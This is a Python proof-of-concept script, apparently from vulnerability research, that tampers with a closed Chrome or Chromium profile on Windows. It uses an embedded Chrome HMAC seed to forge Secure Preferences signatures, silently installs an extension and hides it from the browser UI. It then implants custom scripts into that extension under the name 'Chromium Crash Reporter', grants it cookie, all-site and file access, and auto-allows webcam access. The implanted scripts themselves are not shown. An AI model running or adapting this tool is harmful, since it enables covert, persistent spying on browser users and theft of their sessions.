import hashlib
import hmac
import json
import os
import re
import shutil
import subprocess
import sys
import winreg
from collections import OrderedDict
from copy import deepcopy
from pathlib import Path
from typing import Callable

CHROME_SEED = b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
CHROMIUM_SEED = b''
# CHROMIUM_REGISTRY_SEED = b'ChromeRegistryHashStoreValidationSeed'

HMAC_SEED = b''  # Will be set to CHROME_SEED or CHROMIUM_SEED.


def get_user_sid():
    if sys.platform == 'win32':
        sid = subprocess.check_output(['wmic', 'useraccount', 'where',
                                       f'name=\'{os.getlogin()}\'', 'get', 'sid'], text=True)
        return re.findall(r'^SID\s+(.*)-\d+$', sid.strip())[0]

    raise Exception('This POC only works on Windows')


def is_profile_locked(profile_path: Path):
    lockfile_path = profile_path / 'lockfile'
    try:
        lockfile_path.open('r')
    except FileNotFoundError:
        return False
    except PermissionError:
        return True

    raise Exception('Could not determine if profile is locked')


def remove_empty(d):
    def aux(x, y, d):
        if type(y) == type(OrderedDict()):
            if len(y) == 0:
                del d[x]
            else:
                remove_empty(y)
                if len(y) == 0:
                    del d[x]
        elif type(y) == type({}):
            if len(y) == 0:
                del d[x]
            else:
                remove_empty(y)
                if len(y) == 0:
                    del d[x]
        elif type(y) == type([]):
            if len(y) == 0:
                del d[x]
            else:
                remove_empty(y)
                if len(y) == 0:
                    del d[x]
        else:
            if not y and y not in [False, 0, '']:
                del d[x]

    if type(d) == type(OrderedDict()):
        t = OrderedDict(d)
        for x, y in t.items():
            aux(x, y, d)
    elif type(d) == type([]):
        for x, y in enumerate(d):
            aux(x, y, d)


def value_as_string(value):
    if type(value) == type({}) or type(value) == type(OrderedDict()):
        value = deepcopy(value)
        remove_empty(value)

    return json.dumps(value, separators=(',', ':'), ensure_ascii=False).replace('<', '\\u003C').replace('\\u2122', '™')


def calculate_hmac_from_string(value_as_string, path, sid):
    message = sid + path + value_as_string
    hash_obj = hmac.new(HMAC_SEED, message.encode('utf-8'), hashlib.sha256)
    return hash_obj.hexdigest().upper()


def calculate_hmac(value, path, sid):
    return calculate_hmac_from_string(value_as_string(value), path, sid)


def update_extension_settings(profile_path: Path, user_sid: str, extension_id: str, extension_data_update_callback: Callable[[dict], dict], exists_ok=True):
    preferences_path = profile_path / 'Preferences'
    secure_preferences_path = profile_path / 'Secure Preferences'

    with preferences_path.open(encoding='utf-8') as f:
        preferences = json.load(f, object_pairs_hook=OrderedDict)

    with secure_preferences_path.open(encoding='utf-8') as f:
        secure_preferences = json.load(f, object_pairs_hook=OrderedDict)

    extension_settings = preferences.get(
        'extensions', {}).get('settings', None)
    if extension_settings is None:
        extension_settings = secure_preferences.get(
            'extensions', {}).get('settings', None)

    if extension_settings is None:
        raise Exception(
            'Could not find extensions settings in profile preferences')

    if not exists_ok and extension_id in extension_settings:
        raise Exception(
            f'Extension {extension_id} already exists in profile preferences')

    extension_settings[extension_id] = extension_data_update_callback(
        extension_settings.get(extension_id, {}))

    extension_settings_path = f'extensions.settings.{extension_id}'
    hmac = calculate_hmac(extension_settings[extension_id],
                          extension_settings_path, user_sid)

    extension_settings_macs = preferences.get('protection', {}).get(
        'macs', {}).get('extensions', {}).get('settings', None)
    if extension_settings_macs is None:
        extension_settings_macs = secure_preferences.get('protection', {}).get(
            'macs', {}).get('extensions', {}).get('settings', None)

    if extension_settings_macs is None:
        raise Exception(
            'Could not find extensions settings in profile preferences macs')

    if not exists_ok and extension_id in extension_settings_macs:
        raise Exception(
            f'Extension {extension_id} already exists in profile preferences')

    extension_settings_macs[extension_id] = hmac

    if 'macs' in secure_preferences['protection']:
        supermac = calculate_hmac(
            secure_preferences['protection']['macs'], '', user_sid)
    else:
        supermac = calculate_hmac_from_string('', '', user_sid)

    secure_preferences['protection']['super_mac'] = supermac

    with preferences_path.open('w', encoding='utf-8') as f:
        json.dump(preferences, f)

    with secure_preferences_path.open('w', encoding='utf-8') as f:
        json.dump(secure_preferences, f)


def add_extension(profile_path: Path, user_sid: str, extension_id: str, extension_json: str, extension_src_dir: Path):
    shutil.copytree(extension_src_dir, profile_path /
                    'Extensions' / extension_id, dirs_exist_ok=True)

    update_extension_settings(profile_path, user_sid, extension_id,
                              lambda _: json.loads(extension_json, object_pairs_hook=OrderedDict), exists_ok=False)


def hide_extension(profile_path: Path, user_sid: str, extension_id: str, registry_path: str):
    def extension_data_update_callback(data):
        # ManifestLocation::kExternalComponent
        data['location'] = 10
        return data

    update_extension_settings(profile_path, user_sid,
                              extension_id, extension_data_update_callback)

    key_path = f"{registry_path}\\Extensions\\{extension_id}"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
        value_name = "update_url"
        value_data = "https://clients2.google.com/service/update2/crx"
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)


def add_os_mime_type(file_extension: str, mime_type: str):
    if not re.fullmatch(r'[a-zA-Z0-9]+', file_extension):
        raise ValueError('Invalid file extension')

    key_path = f'Software\\Classes\\.{file_extension}'
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
        value_name = "Content Type"
        value_data = mime_type
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)


def modify_extension(profile_path: Path, user_sid: str, extension_id: str):
    def extension_data_update_callback(data):
        data['manifest']['name'] = 'Chromium Crash Reporter'
        data['manifest']['content_scripts'][0]['js'].append('manifest.json')
        data['manifest']['background']['service_worker'] = '../x.poc_js'
        data['manifest']['icons'] = OrderedDict(
            {'48': 'x.poc_js', '49': 'offscreen.poc_html', '50': 'offscreen.poc_js'})
        data['manifest']['permissions'] = ['cookies', 'offscreen']
        data['manifest']['host_permissions'] = ['<all_urls>']

        # Dicts must be kept sorted.
        data['manifest'] = OrderedDict(sorted(data['manifest'].items()))

        data['newAllowFileAccess'] = True
        data = OrderedDict(sorted(data.items()))
        return data

    update_extension_settings(profile_path, user_sid,
                              extension_id, extension_data_update_callback)

    extension_dir = profile_path / 'Extensions' / extension_id
    extension_version_dir = next(extension_dir.iterdir())

    implanted_code_dir = Path(__file__).parent / 'implanted_code'

    shutil.copy(implanted_code_dir / 'content-script.js',
                extension_version_dir / 'manifest.json')
    shutil.copy(implanted_code_dir / 'service-worker.js',
                extension_version_dir / 'x.poc_js')
    shutil.copy(implanted_code_dir / 'offscreen.html',
                extension_version_dir / 'offscreen.poc_html')
    shutil.copy(implanted_code_dir / 'offscreen.js',
                extension_version_dir / 'offscreen.poc_js')


def set_webcam_permissions(profile_path: Path, rules: list[str]):
    preferences_path = profile_path / 'Preferences'

    with preferences_path.open(encoding='utf-8') as f:
        preferences = json.load(f)

    x = preferences.setdefault('profile', {})
    x = x.setdefault('content_settings', {})
    x = x.setdefault('exceptions', {})
    x = x.setdefault('media_stream_camera', {})
    for rule in rules:
        y = x.setdefault(f'{rule},*', {})
        y['setting'] = 1

    with preferences_path.open('w', encoding='utf-8') as f:
        json.dump(preferences, f)


def main():
    print('POC: Chromium\'s security blind spot: The case of the hidden extension')
    print('=====================================================================')
    print()

    print('Supported Chromium versions: M135 and below')
    print('Supported OS: Windows')
    print()

    print('This script will modify a Chromium profile to achieve the following:')
    print('- Install an extension')
    print('- Hide the newly added extension from the UI')
    print('- Add custom code to the extension without violating its integrity and triggering a reinstallation')
    print('- Make some permission adjustments such as allowing webcam access')
    print()

    if len(sys.argv) == 4:
        profile_path = Path(sys.argv[1])
        registry_path = sys.argv[2]
        is_google_chrome = sys.argv[3]

        print('Using command line arguments:')
        print(f'Profile path: {profile_path}')
        print(f'Registry path: {registry_path}')
        print(f'Is Google Chrome: {is_google_chrome}')
        print()
    else:
        default_profile_path = os.path.expandvars(
            '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default')

        print('Input the path to the Chromium profile you want to modify.')
        print(f'Press Enter to use the default path: {default_profile_path}')
        profile_path = Path(input('Profile path: ') or default_profile_path)
        print()

        default_registry_path = R'Software\Google\Chrome'

        print('Input the registry path for your browser under HKEY_CURRENT_USER.')
        print(f'Press Enter to use the default path: {default_registry_path}')
        registry_path = input('Registry path: ') or default_registry_path
        print()

        print('Google Chrome has a different seed than other Chromium-based browsers.')
        is_google_chrome = None
        while is_google_chrome not in ['y', 'n']:
            is_google_chrome = input('Is it Google Chrome? (y/n) ')
        print()

    if is_profile_locked(profile_path.parent):
        print('The profile is currently in use. Please close the browser and try again.')
        sys.exit(1)

    global HMAC_SEED
    if is_google_chrome == 'y':
        HMAC_SEED = CHROME_SEED
    elif is_google_chrome == 'n':
        HMAC_SEED = CHROMIUM_SEED
    else:
        raise Exception(
            f'Invalid argument: {is_google_chrome}, must be y or n')

    user_sid = get_user_sid()

    extension_id = 'mhlkchmeabcgmaedklpajbokfaapcgoo'
    extension_json = r'{"account_extension_type":0,"active_permissions":{"api":[],"explicit_host":[],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"commands":{},"content_settings":[],"creation_flags":9,"first_install_time":"13383251465627228","from_webstore":true,"granted_permissions":{"api":[],"explicit_host":[],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13383251465627228","location":1,"manifest":{"background":{"scripts":["service_worker.js"],"service_worker":"service_worker.js"},"content_scripts":[{"js":["content_script.js"],"matches":["\u003Call_urls>"],"run_at":"document_start"}],"content_security_policy":{},"description":"Renames tabs to: \"\u003Cindex> \u003Coriginal_name> \u003Chostname>\".","key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtzAkqlrZ+z1bX/ZC/SJmbvwLA+tO8OypH4mNxk87yYNa0+NON8DTi51R0fd9g+MPp+AM2V6XD2fK2mPAaY6bGkDC8wg//ddz4WcNSPasd9ngLpICsnHqNynaMbysYnVMS+HtLcN0govsv3HBTrCRf+jQi92I6TGLPdEiBcGUQj91wwzUnM3GX1qQO5qTYKauJSiJnVHSGLlZuYZWs1sxQ1jh9JTTP4ZoCDc5YokOPYjllrxQ7wgFH86bxl+1+SAWYbaNtpsmjGfkPv4eC+AuMuQpd9G948loINDuH0vrDWzZLmRxs+uFWhz+OmliAyzZGKbLPKMOJtm09C9rMBRxDwIDAQAB","manifest_version":3,"name":"Tab Namer","update_url":"https://clients2.google.com/service/update2/crx","version":"1.3"},"needs_sync":true,"path":"mhlkchmeabcgmaedklpajbokfaapcgoo\\1.3_0","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.3"},"serviceworkerevents":["tabs.onAttached","tabs.onCreated","tabs.onDetached","tabs.onMoved","tabs.onRemoved","tabs.onUpdated"],"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'
    extension_src_dir = Path(extension_id)
    add_extension(profile_path, user_sid, extension_id,
                  extension_json, extension_src_dir)

    hide_extension(profile_path, user_sid, extension_id, registry_path)

    add_os_mime_type('poc_js', 'text/javascript')
    add_os_mime_type('poc_html', 'text/html')

    modify_extension(profile_path, user_sid, extension_id)

    set_webcam_permissions(profile_path, [
        f'chrome-extension://{extension_id}/',
    ])

    print('Done')


if __name__ == '__main__':
    main()
